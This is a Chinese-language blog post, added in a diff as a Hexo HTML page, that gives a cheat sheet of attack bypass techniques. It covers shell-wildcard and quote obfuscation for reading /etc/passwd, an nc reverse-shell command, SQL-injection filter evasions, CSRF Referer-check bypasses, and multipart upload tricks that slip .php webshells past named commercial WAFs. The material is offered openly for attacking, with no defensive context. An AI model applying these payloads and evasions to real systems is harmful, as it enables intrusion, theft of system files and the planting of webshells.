@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/zzz_favicon-32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/zzz_favicon-16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一些常见漏洞的简单绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过基本技巧">
+<meta property="og:url" content="http://yoursite.com/2019/03/19/绕过基本技巧/index.html">
+<meta property="og:site_name" content="Sakura">
+<meta property="og:description" content="一些常见漏洞的简单绕过">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-23T07:33:55.750Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="绕过基本技巧">
+<meta name="twitter:description" content="一些常见漏洞的简单绕过">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/19/绕过基本技巧/">
+
+
+
+
+
+  <title>绕过基本技巧 | Sakura</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakura</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/19/绕过基本技巧/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Zzz">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/tx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakura">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">绕过基本技巧</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-19T21:06:48+08:00">
+                2019-03-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/03/19/绕过基本技巧/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2019/03/19/绕过基本技巧/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一些常见漏洞的简单绕过<a id="more"></a></p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="0x01-通配符"><a href="#0x01-通配符" class="headerlink" title="0x01 通配符"></a>0x01 通配符</h2><p><code>*</code>    代表『 0 个到无穷多个』任意字符<br><code>?</code>    代表『一定有一个』任意字符<br><code>[ ]</code>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』<br><code>[ - ]</code>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！<br><code>[^ ]</code>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</p>
+<p>例如<br><code>ls -l</code><br><code>/?in/?s -l</code></p>
+<p>读取/etc/passwd</p>
+<p><code>/???/??t /??c/p???w?</code></p>
+<p>NC反弹shell<br><code>nc -e /bin/bash 127.0.0.1 2333</code><br>ip是可以转为整型的</p>
+<h2 id="0x02-连接符"><a href="#0x02-连接符" class="headerlink" title="0x02 连接符"></a>0x02 连接符</h2><p>唯一需要注意的就是闭合，这点很重要，利用这个我们可以绕过一些匹配字符串的WAF规则</p>
+<p><code>/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t&#39; /&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code></p>
+<p>检查NC<br><code>/&#39;b&#39;i&#39;n&#39;/&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</code><br>反斜杆<br><code>/b\i\n/w\h\i\c\h n\c</code></p>
+<h1 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h1><h2 id="0x01-空格问题"><a href="#0x01-空格问题" class="headerlink" title="0x01 空格问题"></a>0x01 空格问题</h2><p>必须要在字段前（强调：字段前）添加这些特殊字符，或者这些特殊字符包含字段 且一旦写入这些字符，可以不需要空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">替代空格：    %20 %09 %0a %0b %0c %0d %a0 /***/   包含字段的特殊符号，字段前添加 </span><br><span class="line">代替and：     &amp;&amp; </span><br><span class="line">代替or：      || </span><br><span class="line">代替=：       like </span><br><span class="line">替代union：   || (select user()) = &apos;root@localhost&apos;</span><br><span class="line">1e0      科学计数法 </span><br><span class="line">+        字段前添加                        字符串连接    可以逃过空格和关键字过滤 </span><br><span class="line">‐        字段前添加                    </span><br><span class="line">.        字段前添加                 </span><br><span class="line">~        字段前添加 </span><br><span class="line">!        字段前添加 </span><br><span class="line">` `      包含的字段必须是数据库已有的字段    使用反引号`，例如select `version()`， 可以用来过空格和正则，特殊情况下还可以将其做注释符用 </span><br><span class="line">@&apos; &apos;     随意包含字段                   可以逃过空格 </span><br><span class="line">|@a:=()  定义变量名                         竖线表示分割语句 </span><br><span class="line">&apos; &apos;      随意包含字段                        可以逃过空格 </span><br><span class="line">&quot; &quot;      随意包含字段                        可以逃过空格 </span><br><span class="line">( )      随意包含字段和语句                可以逃过空格 只能出现在select的s前面， 替代空格</span><br></pre></td></tr></table></figure>
+<p>注入点的一种判断<br><code>id=1 and {`</code>1=1}`</p>
+<p>注释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- </span><br><span class="line">-- -</span><br><span class="line">-- +</span><br></pre></td></tr></table></figure></p>
+<p>()包裹子句<br><code>union(select 1,2,3)</code></p>
+<p>一个例句<code>select(left((select(user)from(users)limit/**/1),0x03));</code></p>
+<h2 id="0x02-函数与编码"><a href="#0x02-函数与编码" class="headerlink" title="0x02 函数与编码"></a>0x02 函数与编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">sql函数&amp;关键字： </span><br><span class="line">MySQL： </span><br><span class="line">union distinct </span><br><span class="line">union distinctrow </span><br><span class="line">procedure analyse() </span><br><span class="line">updatexml() </span><br><span class="line">extracavalue() </span><br><span class="line">exp() </span><br><span class="line">ceil() </span><br><span class="line">atan() </span><br><span class="line">sqrt() </span><br><span class="line">floor() </span><br><span class="line">ceiling() </span><br><span class="line">tan() </span><br><span class="line">rand() </span><br><span class="line">sign() </span><br><span class="line">greatest()</span><br><span class="line"></span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1) </span><br><span class="line">Substr(version(),1,1) </span><br><span class="line">Substring(version(),1,1) </span><br><span class="line">Lpad(version(),1,1) </span><br><span class="line">Rpad(version(),1,1) </span><br><span class="line">Left(version(),1) </span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line"></span><br><span class="line">字符串连接函数 </span><br><span class="line">concat(version(),&apos;|&apos;,user()); </span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)</span><br><span class="line"></span><br><span class="line">字符转换 </span><br><span class="line">Char(49) </span><br><span class="line">Hex(&apos;a&apos;) </span><br><span class="line">Unhex(61)</span><br><span class="line"></span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号： limit 1 offset 0 </span><br><span class="line">(2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1)</span><br><span class="line"></span><br><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER() </span><br><span class="line">IS_MEMBER() </span><br><span class="line">HAS_DBACCESS() </span><br><span class="line">convert() </span><br><span class="line">col_name() </span><br><span class="line">object_id() </span><br><span class="line">is_srvrolemember() </span><br><span class="line">is_member()</span><br><span class="line"></span><br><span class="line">字符串截取函数 </span><br><span class="line">Substring(@@version,1,1) </span><br><span class="line">Left(@@version,1) </span><br><span class="line">Right(@@version,1)</span><br><span class="line"></span><br><span class="line">字符串转换函数 </span><br><span class="line">Ascii(&apos;a&apos;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass </span><br><span class="line">Char(&apos;97&apos;) </span><br><span class="line">exec</span><br></pre></td></tr></table></figure>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>主要是验证referer的内容 和添加scrf-token</p>
+<p>1.删除referer来判断是否存在漏洞</p>
+<p>2.判断Referer是某域情况下绕过</p>
+<p> 比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  可以找个二级域名 之后&lt; img “csrf地址”&gt;  之后在把文章地址发出去 就可以伪造。</p>
+<p>3.判断Referer是否存在某关键词</p>
+<p>  referer判断存在不存在google.com这个关键词</p>
+<p>  在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过</p>
+<p>4.判断referer是否有某域名</p>
+<p>   判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</p>
+<h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><h2 id="1：WTS-WAF-绕过上传"><a href="#1：WTS-WAF-绕过上传" class="headerlink" title="1：WTS-WAF 绕过上传"></a>1：WTS-WAF 绕过上传</h2><p>原内容：<br>Content-Disposition: form-data; name=”up_picture”; filename=”xss.php”<br>添加回车<br>Content-Disposition: form-data; name=”up_picture”; filename=”xss.ph<br>p”</p>
+<h2 id="2：百度云上传绕过见下："><a href="#2：百度云上传绕过见下：" class="headerlink" title="2：百度云上传绕过见下："></a>2：百度云上传绕过见下：</h2><p>百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。Content-Disposition: form-data; name=”up_picture”; filename=”xss.jpg .Php”</p>
+<h2 id="3：阿里云上传绕过见下："><a href="#3：阿里云上传绕过见下：" class="headerlink" title="3：阿里云上传绕过见下："></a>3：阿里云上传绕过见下：</h2><p>源代码：<br>Content-Disposition: form-data; name=”img_crop_file”; filename=”1.jpg .Php”Content-Type: image/jpeg<br>修改如下：<br>Content-Disposition: form-data; name=”img_crop_file”; filename=”1.php”<br>没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。</p>
+<h2 id="4：安全狗上传绕过见下："><a href="#4：安全狗上传绕过见下：" class="headerlink" title="4：安全狗上传绕过见下："></a>4：安全狗上传绕过见下：</h2><p>源代码:<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png”Content-Type: image/png<br>绕过内容如下：<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png<br>C.php”<br>删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php”</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>关于xss网上的绕过文章网上一堆 这里就不细讲了 贴两个链接<br><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤速查表</a><br><a href="https://blog.csdn.net/fly_hps/article/details/79959983" target="_blank" rel="noopener">XSS绕过各种姿势</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/13/sql常见绕过/" rel="next" title="sql常见绕过">
+                <i class="fa fa-chevron-left"></i> sql常见绕过
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div class="ds-thread" data-thread-key="2019/03/19/绕过基本技巧/" data-title="绕过基本技巧" data-url="http://yoursite.com/2019/03/19/绕过基本技巧/">
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/tx.jpg" alt="Zzz">
+            
+              <p class="site-author-name" itemprop="name">Zzz</p>
+              <p class="site-description motion-element" itemprop="description">明明只是活着 哀伤却无处不在</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#命令执行"><span class="nav-number">1.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-通配符"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 通配符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-连接符"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 连接符</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-注入"><span class="nav-number">2.</span> <span class="nav-text">sql 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-空格问题"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 空格问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-函数与编码"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 函数与编码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#上传绕过"><span class="nav-number">4.</span> <span class="nav-text">上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1：WTS-WAF-绕过上传"><span class="nav-number">4.1.</span> <span class="nav-text">1：WTS-WAF 绕过上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2：百度云上传绕过见下："><span class="nav-number">4.2.</span> <span class="nav-text">2：百度云上传绕过见下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3：阿里云上传绕过见下："><span class="nav-number">4.3.</span> <span class="nav-text">3：阿里云上传绕过见下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4：安全狗上传绕过见下："><span class="nav-number">4.4.</span> <span class="nav-text">4：安全狗上传绕过见下：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-number">5.</span> <span class="nav-text">XSS</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zzz</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"Name?"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
